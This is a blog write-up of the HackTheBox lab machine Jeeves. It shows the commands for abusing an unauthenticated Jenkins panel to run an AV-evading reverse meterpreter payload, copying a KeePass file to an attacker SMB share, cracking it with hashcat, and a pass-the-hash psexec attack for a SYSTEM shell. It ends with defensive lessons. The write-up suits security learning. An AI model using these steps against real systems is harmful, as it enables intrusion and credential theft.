---
layout: post
title: 'HackTheBox - Jeeves'
date: 2018-05-20
author: Casey Mullineaux
cover: '/images/htb/jeeves/jeeves.png'
tags: hackthebox
---

**Jeeves** demonstrates the seriousness of securing access to applications,  and the importance of practising good password hygiene.

First, I take advantage of [broken access controls](https://www.owasp.org/index.php/Broken_Access_Control) on a Jenkins installation to obtain remote code execution (RCE) and gain a foothold on the system. 

Next, I locate a KeePass database and due to bad password practices, I am able to crack the database and obtain the NTLM hash of an Administrator.

Finally, I use a technique called **pass the hash** to fully compromise the system.

# Hacking the box

1. [Enumeration](#enum)
2. [Exploitation](#exploit)
3. [Privilege escalation](#privesc)
4. [Deconstructing the hack](#deconstruct)

# <a name="enum"></a> Enumeration

To start things off, I run a standard nmap scan.

```bash
nmap -sC -sV -oA jeeves 10.10.10.63
```
![htb-jeeves-01](/images/htb/jeeves/htb-jeeves-01.png)

The results show a website running on port 80 using IIS, and another HTTP service on port 50000 using Jetty. 

Browing to the site shows us the AskJeeves search engine which, kicks me right in the nostalgia. 

![htb-jeeves-02](/images/htb/jeeves/htb-jeeves-02.png)

I enter a search term and .NET throws a SQL exception.

![htb-jeeves-03](/images/htb/jeeves/htb-jeeves-03.png)

At this point I thought I would be dealing with a SQL injection vulnerability, however, upon closer inspection, I'm simply being trolled. This is a static image, not a genuine .NET error. 

![htb-jeeves-04](/images/htb/jeeves/htb-jeeves-04.png)
Well played Jeeves, well played ...

Next I fired off a directory brute force attack using `gobuster`. 

```bash
gobuster -u http://10.10.10.63 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 50
```

<p align="center">
    <img src="https://media.giphy.com/media/l0MYygru78omluZuE/giphy.gif">
</p>

As the `gobuster` scan failed to produce anything, I started to think that this might be a rabbit hole that leads nowhere. I decided to move on with the consideration of coming back if the other currently unexplored services bare no fruit.

Browsing to the server on port 50000 doesn't reveal much. The default page exposes that it's running on Jetty and the version number, but nothing I didn't already get from nmap.
![htb-jeeves-06](/images/htb/jeeves/htb-jeeves-06.png)

Just like the web service on port 80, I attempt a dictionary brute force attack on the Jetty web server. This time I land a hit.
```bash
gobuster -u http://10.10.10.63:50000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 50
```
![htb-jeeves-07a](/images/htb/jeeves/htb-jeeves-07a.png)

I browse to **/askjeeves** and hit the jackpot. I land on the administration panel of a [Jenkins](https://jenkins.io/) installation that provides me with unauthenticated administrative access to the platform. 
![htb-jeeves-09](/images/htb/jeeves/htb-jeeves-09.png)

<p align="center">
    <img src="https://media.giphy.com/media/vMnuZGHJfFSTe/giphy.gif">
</p>

# <a name="exploitation"></a> Exploitation

Jenkins is an open source automation platform, whereby one of its core features is to use 'build agents' to execute code. I thought that this would be the best avenue for exploitation as I could use the system itself to deliver and execute my malicious payload.

On my Kali machine, I use [unicorn](https://github.com/trustedsec/unicorn) to generate shellcode that will be executed in memory (therefore avoiding AV) to spawn a PowerShell process to return a reverse meterpreter shell. I then use the Jenkins build agent to execute the payload.

---
First I clone the `unicorn` repo to */opt/powershell*

```bash
git clone https://github.com/trustedsec/unicorn.git /opt/powershell/unicorn
```

Then call `unicorn.py` with parameters to encode a reverse tcp meterpreter shell.
```bash
python /opt/powershell/unicorn/unicorn.py windows/meterpreter/reverse_tcp 10.10.15.216 1337
```

This will generate two files.
* **unicorn.rc** - This a ruby script that will fire up Metasploit and start a listener based on what parameters we sent through to `unicorn.py`
* **powershell_attack.txt** - This is the encoded payload to be executed on the remote system.

I start the reverse listener in Metasploit by using the `-r` parameter, and specifying the location of `unicorn.rc`
```bash
msfconsole -r ./unicorn.rc
```
This should result in a new meterpreter session, with a reverse handler ready and listening.
![htb-jeeves-08](/images/htb/jeeves/htb-jeeves-08.png)

With the listener ready to go, it's time to deliver the reverse shell payload. I browse back to the Jenkins server and create a new Freestyle project.
![htb-jeeves-10](/images/htb/jeeves/htb-jeeves-10.png)

I add a new build step to execute a Windows batch command
![htb-jeeves-11](/images/htb/jeeves/htb-jeeves-11.png)

And in the command box, I copy the contents of the *powershell_attack.txt* that was generated by `unicorn`.
![htb-jeeves-12](/images/htb/jeeves/htb-jeeves-12.png)

I then save and run the build.
![htb-jeeves-13](/images/htb/jeeves/htb-jeeves-13.png)

When the build runs, the PowerShell payload is executed, and I successfully get my reverse shell in Metasploit.
![htb-jeeves-14](/images/htb/jeeves/htb-jeeves-14.png)

On the desktop of user *kohsuke* sits the flag.
```cmd
c:\Users\kohsuke\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is BE50-B1C9

 Directory of c:\Users\kohsuke\Desktop

11/03/2017  11:19 PM    <DIR>          .
11/03/2017  11:19 PM    <DIR>          ..
11/03/2017  11:22 PM                32 user.txt
               1 File(s)             32 bytes
               2 Dir(s)   6,918,385,664 bytes free
```

<p class="success">user flag obtained!</p>

# <a name="privesc"></a> Privilege escalation
## Cracking the KeePass database
After spending some time enumerating the system, I come across a password protected (encrypted) KeyPass file located in the user's Documents folder.
```cmd
c:\Users\kohsuke\Documents>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is BE50-B1C9

 Directory of c:\Users\kohsuke\Documents

11/03/2017  11:18 PM    <DIR>          .
11/03/2017  11:18 PM    <DIR>          ..
09/18/2017  01:43 PM             2,846 CEH.kdbx
               1 File(s)          2,846 bytes
               2 Dir(s)   6,918,385,664 bytes free
```

To transfer this file over to my system, I use `impacket-smbserver` on my Kali host to start an smb server that hosts a shared folder called *share*. 
```bash
impacket-smbserver share ~/htb/jeeves/smb/
```

On Jeeves, I map a network drive to the share and copy over the Keypass file.
```cmd
c:\Users\kohsuke\Documents>net use x: \\10.10.15.78\share
net use x: \\10.10.15.78\share
The command completed successfully.


c:\Users\kohsuke\Documents>copy CEH.kdbx X:\
copy CEH.kdbx X:\
        1 file(s) copied.

c:\Users\kohsuke\Documents>
```

Using `keepass2john` I extract the password hash of the Keypass database.
```bash
root@kali:~/htb/jeeves/smb# keepass2john CEH.kdbx > kp.hash
```

`keepass2john` will automatically prepend the name of the file to the begining of the hash. This causes a problem when we want to pass it to another application (such as `hashcat`) to crack it, as it's not expecting the file name to be present. So using a text editor, I remove the file name (in this case, `CEH:`) from kp.hash. After doing so, the hash looks like this. 
```bash
root@kali:~/htb/jeeves/smb# cat kp.hash 
$keepass$*2*6000*222*1af405cc00f979ddb9bb387c4594fcea1fd01a6a0757c000e1873f3c71941d3d*3869fe357ff2d7db1555cc668d1d606b1dfaf02b9dba2621cbe9ecb63c7a4091*393c97beafd8a820db9142a6a94f03f6*b73766b61e656351c3aca0282f1617511031f0156089b6c5647de4671972fcff*cb409dbc0fa660fcffa4f1cc89f728b68254db431a21ec33298b612fe647db48
```

Next, I use `hashcat` to crack the password hash of the KeePass database. `hashcat` requires that you specify the *mode*, which is basically the type of hashing algorithm used to encrypt the password hash. Grepping the hashcat help reveals the mode I'm looking for is **13400**.
```bash
root@kali:~/htb/jeeves/smb# hashcat --help | grep -i keepass
  13400 | KeePass 1 (AES/Twofish) and KeePass 2 (AES)      | Password Managers
```

I fire off `hashcat` and crack the password in just over a minute. The password to the KeePass database is **moonshine1**.
![htb-jeeves-15](/images/htb/jeeves/htb-jeeves-15.png)
<p align="center">
    <img src="https://media.giphy.com/media/a0h7sAqON67nO/giphy.gif">
</p>

## Pass the hash

Now that I've cracked the KeePass database, let's take a look at that juicy loot!

I install **KeePass2** (`apt install keepass2`) and open up the file using the cracked password.
![htb-jeeves-16](/images/htb/jeeves/htb-jeeves-16.png)

After taking a look around, there's only two passwords that are of real interest.
![htb-jeeves-17](/images/htb/jeeves/htb-jeeves-17.png)
1. DC Recovery PW - `adminstrator:S1TjAtJHKsugh9oC4VZl`
2. Backup stuff - `<none>:aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00`

The DC Recovery Password is only useful if we have a domain controller, so I focus my efforts on #2 which looks to be an NTLM hash.

Instead of trying to crack the NTLM hash to translate it into a plain text password, I use a technique called **pass the hash**. 
> Pass the hash is a hacking technique that allows an attacker to authenticate to a remote server or service by using the underlying NTLM or LanMan hash of a user's password, instead of requiring the associated plaintext password as is normally the case.

Back in Metasploit, I load up the `psexec` module. 
```bash
msf > use exploit/windows/smb/psexec
```

I set the payload to a reverse tcp meterpreter shell, and configure all the networking options. 
```bash
msf exploit(windows/smb/psexec) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf exploit(windows/smb/psexec) > set LHOST tun0
LHOST => 10.10.15.78
msf exploit(windows/smb/psexec) > set LPORT 443
LPORT => 443
msf exploit(windows/smb/psexec) > set RHOST 10.10.10.63
RHOST => 10.10.10.63
```

Next I set the SMBUSER options, specifiying the NTLM hash as the password. 
```bash
msf exploit(windows/smb/psexec) > set SMBUSER Administrator
SMBUSER => Administrator     
msf exploit(windows/smb/psexec) set SMBPASS aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
SMBPASS => aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
```

Finally, I trigger the exploit.
```bash
msf exploit(windows/smb/psexec) exploit
                                                               
[*] Started reverse TCP handler on 10.10.15.36:4444            
[*] 10.10.10.63:445 - Connecting to the server...                     
[*] 10.10.10.63:445 - Authenticating to 10.10.10.63:445 as user 'Administrator'...
[*] 10.10.10.63:445 - Selecting PowerShell target                                                                 
[*] 10.10.10.63:445 - Executing the payload...                              
[+] 10.10.10.63:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (179779 bytes) to 10.10.10.63                                                                                             
[*] Meterpreter session 1 opened (10.10.15.78:4444 -> 10.10.10.63:49691) at 2018-01-30 15:38:31 +1100
```

I then drop into a shell and check privileges.
```
meterpreter > shell                                                                        
Process 2856 created.                                                              
Channel 1 created.
Microsoft Windows [Version 10.0.10586]
(c) 2015 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```
![htb-jeeves-18](/images/htb/jeeves/htb-jeeves-18.png)
<p align="center">
    <img src="https://media.giphy.com/media/lp3GUtG2waC88/giphy.gif">
</p>

## Alternate data streams
I quickly go browsing for the root flag, but it looks like the challenge isn't over yet...
```cmd
c:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is BE50-B1C9

 Directory of c:\Users\Administrator\Desktop

05/20/2018  04:37 AM    <DIR>          .
05/20/2018  04:37 AM    <DIR>          ..
12/24/2017  03:51 AM                36 hm.txt
               1 File(s)             36 bytes
               2 Dir(s)   6,913,200,128 bytes free

c:\Users\Administrator\Desktop>type hm.txt
type hm.txt
The flag is elsewhere.  Look deeper.
```
<p align="center">
    <img src="https://media.giphy.com/media/IYIlvuWc21U4g/giphy.gif">
</p>

Look deeper eh? Let's do just that.
>The NTFS file system includes support for alternate data streams. This is not a well-known feature and was included, primarily, to provide compatibility with files in the Macintosh file system. Alternate data streams allow files to contain more than one stream of data. Every file has at least one data stream. In Windows, this default data stream is called :$DATA.

I background my meterpreter shell with `CTRL + Z`, and load a new PowerShell session.
```cmd
c:\Users\Administrator\Desktop>^Z
Background channel 1? [y/N]  y
meterpreter > load powershell
Loading extension powershell...Success.
meterpreter > powershell_shell
PS >
```

Using PowerShell I can quickly check `hm.txt` for an alternate data stream.
```powershell
PS > cd c:\users\Administrator\Desktop
PS > Get-Item hm.txt -stream *


   FileName: C:\users\Administrator\Desktop\hm.txt

Stream                   Length
------                   ------
:$DATA                       36
root.txt                     34


PS > 
```

Here I can see the default data stream of `:$DATA`, but also another datastream called `root.txt`. Reading the contents of the root.txt datastream is easy.
```powershell
PS > Get-Content hm.txt -stream root.txt
```

<p class="success">root flag obtained!</p>

<p align="center">
    <img src="https://media.giphy.com/media/8UF0EXzsc0Ckg/giphy.gif">
</p>


# <a name="deconstruct"></a>Deconstructing the hack
Boy o' boy, this was a fun challenge! There was a lot going on in this one, but everything comes back to two vulnerabilities.
1. broken access controls (#5 on the [OWASP Top 10 for 2017](https://www.owasp.org/images/7/72/OWASP_Top_10-2017_%28en%29.pdf.pdf))
2. password strength 

## Jenkins
Jenkins displays a great example of **broken access controls**. OWASP describes this as:
> Restrictions on what authenticated users are allowed to do are often not properly enforced. Attackers can exploit these flaws to access unauthorized functionality and/or data, such as access other users' accounts, view sensitive files, modify other users’ data, change access rights, etc.

Without the implementation of proper access controls on the Jenkins installation, I was able to execute any code I wanted on the remote system.

When configuring an application, or even writing your own, **always** ensure you are implementing controls that correctly scope and restrict access to the application's functions and data.

<iframe width="560" height="315" src="https://www.youtube.com/embed/P38at6Tp8Ms?rel=0" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe>

## KeePass
The KeePass database file demonstrates an example of insufficient password strength.
> Password strength is a measure of the effectiveness of a password against guessing or brute-force attacks. In its usual form, it estimates how many trials an attacker who does not have direct access to the password would need, on average, to guess it correctly. The strength of a password is a function of length, complexity, and unpredictability.

Practising good password hygiene is the only way to prevent this kind of vulnerability. 

For more information on this topic, and five simple steps to create a strong password, check out my post on [good password hygiene](https://blog.mullineaux.com.au/good-password-hygiene/).
